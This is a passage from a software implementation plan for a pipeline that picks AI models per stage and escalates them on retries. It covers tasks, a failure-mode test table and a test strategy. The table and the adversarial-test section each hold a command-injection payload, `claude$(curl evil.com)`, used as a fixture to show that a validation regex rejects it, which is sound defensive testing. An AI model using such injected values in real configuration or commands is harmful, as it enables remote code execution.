  | `implementing`  | `claude-opus-4-7` (D-008: stays Opus until ENG-101 stabilises; flip to `claude-sonnet-4-6` once observed-good) |
  | `ui`            | `claude-sonnet-4-6` |
  | `reviewing`     | `claude-opus-4-7` |
  | `qa`            | `claude-sonnet-4-6` |
  | `building`      | `claude-haiku-4-5-20251001` |
  | `released`      | (unset — subscription default) |

  4. Unset (stage absent from default table) → no `--model` flag →
     subscription default.

  ```json
  {
    "dispatch": {
      "model": {
        "implementing": "claude-opus-4-7[1m]",
        "qa": "claude-sonnet-4-6"
      }
    }
  }
  ```

  Validation: identifier regex `^[A-Za-z0-9._\[\]:-]+$` permits bracketed
  forms (`claude-opus-4-7[1m]`) and date-suffixed forms
  (`claude-haiku-4-5-20251001`); rejects shell-meta payloads. Stage keys
  are gerund form (`brainstorming, planning, implementing, ui, reviewing,
  qa, building, released`); unknown key silently falls through.

  Spot-check: `bash bin/status.sh` reads `events.jsonl::model` from
  ENG-26 telemetry. Confirm post-ship that implementing rows show
  `claude-sonnet-4-6` on first passes (after the D-008 flip),
  `claude-opus-4-7` on retries, and building rows show
  `claude-haiku-4-5-20251001`.

  Operator-resolution log: `dispatch model=<resolved> (stage=<stage>)`
  in `$PROJECT_STATE_DIR/<slug>/logs/<ident>-<stage>-*.log`. The
  authoritative per-dispatch model is `usage-<stage>.json::model`
  (what claude actually billed against) — they can diverge if the
  subscription doesn't have access to the requested tier.

  Escalation predicate sits next to (does NOT override) `guards.sh::check`'s
  `implement_rejection` halt-threshold (default 2). After two failed
  implement passes, the second one already escalated to Opus, then
  guards trip and halt for human review.

  Operator-tunable escalation thresholds (a future `dispatch.model_escalation[<stage>]`
  config key) are deferred to a follow-up (brainstorm OQ-4); today's
  predicate is hard-coded `>= 1`. An operator wanting to skip the cheap
  cycle entirely can pin `dispatch.model[<stage>]` to `claude-opus-4-7`
  directly, which wins over the escalation override per the precedence
  table above.
  ```

### Task 8: Run the test suite and verify

- `depends_on: [5, 6, 7]`
- `touches: (verification only — no edits)`
- [ ] Run `bash bin/run-stage-model-test.sh` directly; assert
  `passed=N failed=0` for N >= 16 (16 resolver fixtures + 3 counter
  fixtures = 19 minimum).
- [ ] Run `bash bin/dispatch-test.sh` directly; assert the two new
  Group 5 ENG-103 fixtures pass AND no previously-passing fixture
  regresses (Group 1-5 + later groups stay green).
- [ ] Run `bash .githooks/pre-commit`; assert the full
  `bin/*-test.sh` enumeration passes with `bin/run-stage-model-test.sh`
  now included.
- [ ] Spot-check `bash bin/secret-probe-lint.sh` over the touched
  files (`bin/run-stage.sh`, `bin/dispatch.sh`) returns clean (no
  ENG-46-banned env-var-expansion shapes introduced).

## Frontend Tasks

(no frontend surface — orchestrator-internal change)

## Failure Mode → Test Map

| Failure mode | Trigger | Expected behavior | Test layer | Test name |
|---|---|---|---|---|
| Missing config file | `.pipeline-config/config.json` absent | Resolver layer 1 returns empty; layer 2/3 still evaluated | unit | `bin/run-stage-model-test.sh::fixture-3-no-config-implement-default` |
| Config sets stage to empty string | `dispatch.model.implementing = ""` | Layer 1 returns empty (jq `// empty` semantics); falls through to layer 2/3 | unit | `bin/run-stage-model-test.sh::fixture-3-no-config-implement-default` (same shape — empty string is jq-empty) |
| Config sets stage to non-string (integer) | `dispatch.model.implementing = 60` | jq returns `"60"`; regex rejects (no shell-meta but operator likely meant a different key); log warn + fall through to default | unit | `bin/run-stage-model-test.sh::fixture-14-config-integer-falls-through` |
| Config sets stage to shell-meta payload | `dispatch.model.implementing = "claude$(curl evil.com)"` | Regex `^[A-Za-z0-9._\[\]:-]+$` rejects (`$()` not in char class); log warn + fall through to default | unit | `bin/run-stage-model-test.sh::fixture-16-adversarial-shellmeta-rejected` |
| Loopback escalation fires (rebase) on `ui` | `verdict result=fail target=ui` count = 2 since last `to=ui` transition | Resolver returns `claude-opus-4-7` — distinguishable from ui's `claude-sonnet-4-6` default, so this fixture proves the layer-2 escalation path executes on initial commit | unit | `bin/run-stage-model-test.sh::fixture-7-ui-count-2-escalated` |
| Loopback escalation regression sentinel on `implementing` | `verdict result=fail target=implementing` count = 1 | Resolver returns `claude-opus-4-7`; initial commit this matches the default (D-008), so fixture #4 is a regression sentinel proving layer-2 path doesn't silently break before the D-008 flip lands | unit | `bin/run-stage-model-test.sh::fixture-4-implement-count-1-escalated` |
| Loopback escalation higher count | `verdict result=fail target=implementing` count = 3 | Resolver returns `claude-opus-4-7` (no behavior cliff at higher counts) | unit | `bin/run-stage-model-test.sh::fixture-5-implement-count-3-escalated` |
| Loopback rejection older than transition | One fail marker older than the most-recent `to=implementing` transition | Count = 0; cheap default fires | unit | `bin/run-stage-model-test.sh::fixture-15-rejection-older-than-transition` |
| Config overrides escalation | Config pins `implementing = claude-sonnet-4-6`, count = 5 | Layer 1 wins; resolver returns `claude-sonnet-4-6` | unit | `bin/run-stage-model-test.sh::fixture-13-config-beats-escalation` |
| Linear API outage during escalation count | `bash bin/linear.sh get-comments` returns non-zero | Counter returns 0; resolver returns the cheap default (fail-open to cheap tier; Linear-back-online resolves on next tick) | unit | `bin/run-stage-model-test.sh::counter-fixture-A-no-comments` (stub returns null) |
| Released stage dispatched | `_resolve_dispatch_model released ENG-X` | Returns empty (no `--model` flag); dispatch.sh elides the flag; claude uses subscription default | unit | `bin/run-stage-model-test.sh::fixture-11-released-unset` |
| `--model` splice fires on PIPELINE_DISPATCH_MODEL set | `PIPELINE_DISPATCH_MODEL=claude-sonnet-4-6` + DRY_RUN | DRY_RUN log contains `--model claude-sonnet-4-6` | unit | `bin/dispatch-test.sh::ENG-103 DRY_RUN log --model splice` |
| `--model` omitted on PIPELINE_DISPATCH_MODEL unset | DRY_RUN only | DRY_RUN log contains no `--model` token | unit | `bin/dispatch-test.sh::ENG-103 DRY_RUN log --model omitted` |
| Bracketed `[1m]` model name | Config sets `implementing = claude-opus-4-7[1m]` | Regex accepts; resolver returns the literal verbatim (no quoting strip) | unit | `bin/run-stage-model-test.sh::fixture-12-bracketed-1m-form` |
| Operator-set PIPELINE_DISPATCH_MODEL leaks across ticks | Operator manually exports the env var before `bin/run-local.sh` | run-stage.sh's per-tick env-export at the dispatch site overwrites with the resolved value; no leakage | integration | (covered by Task 3's explicit re-export; verified by inspection of the `PIPELINE_DISPATCH_MODEL="$resolved_model" \` line at the dispatch call site) |
| Claude rejects requested model (subscription mismatch) | claude exits non-zero with auth/access error | dispatch_rc non-zero; existing `classify_failure` path fires; `usage-<stage>.json::model` reflects actual (or empty); operator inspects log and adjusts config | integration | (out of unit scope — covered by existing dispatch failure-path coverage in `bin/dispatch-test.sh` Group 3 result-event fixtures) |
| Stage absent from default table (e.g. future stage) | New stage not in case statement | Resolver returns empty; dispatch.sh elides `--model`; subscription default applies | unit | `bin/run-stage-model-test.sh::fixture-11-released-unset` (released exercises the fall-through path) |

## Test Strategy

**Unit (primary):**
- `bin/run-stage-model-test.sh` covers all 16 D-006 resolver fixtures
  plus 3 counter-isolation fixtures (A: empty comments, B: fail after
  transition, C: fail before transition). The test-isolation pattern
  (source `bin/run-stage.sh`, stub `bin/linear.sh get-comments`)
  follows the precedent from `bin/dispatch-test.sh` lines 13-75.
- `bin/dispatch-test.sh` Group 5 gains two ENG-103 fixtures (positive
  + negative) using the existing `_eng65_run_dispatch_dryrun`-style
  invocation pattern.

**Integration:**
- `bin/dry-run.sh` (existing) exercises the full `run-local.sh →
  poll.sh → run-stage.sh → dispatch.sh` flow with `PIPELINE_DRY_RUN=1`.
  Post-implement, an operator running
  `PIPELINE_DRY_RUN=1 TARGET_REPO=/path bash bin/dry-run.sh` and
  inspecting `local-*.log` should see `dispatch model=...` lines on
  every per-stage dispatch sample. (No explicit assertion added to
  `dry-run.sh` — this is an operator smoke-test, not a unit gate.)

**Smoke (post-merge):**
- One real dispatch each on `brainstorming`, `implementing`, `building`
  (per the D-006 stages with non-Opus defaults). Inspect
  `usage-<stage>.json::model` and confirm it matches the resolver's
  output. Confirm cost-drop in `events.jsonl` per the brainstorm's
  target (≥ 50% implementing, ≥ 70% building) over the first 20
  dispatches.

**Adversarial:**
- Fixture #16 (`claude$(curl evil.com)` in operator config) covers the
  command-injection attack surface. The regex `^[A-Za-z0-9._\[\]:-]+$`
  is the only validation layer between `dispatch.model[<stage>]` and
  `--model "$resolved"`; injecting a shell-meta payload there is the
  only credible attack vector. Validated.

**Test-gate closure sweep result:** Zero tokens/symbols are REMOVED
from production code by this plan (the change is purely additive: new
helpers, new conditional argv splice, new test file, new CLAUDE.md
section, new profile allowlist entries). The existing
`bin/dispatch-test.sh` fixtures at lines 517/521/531/537/593/608/611/629/631
embed the literal string `claude-opus-4-7` or `claude-opus-4-7[1m]` as
*stream-json fixture data* asserting the renderer correctly extracts
the model field from claude's output — these continue to pass unchanged
because the renderer logic is untouched. No sibling test file gates on
a token this plan deletes.

**Branch-rebase impact (Task 0):** Post-rebase, `bin/dispatch.sh:620`
changes from `[[ -n "$_gtime_out" ]] && rm -f "$_gtime_out"` to an
`if`-block. The plan's edits at `bin/dispatch.sh:511-517` (DRY_RUN log)
and `:561-568` (cmd composition) are unaffected; both content anchors
remain unique post-rebase.
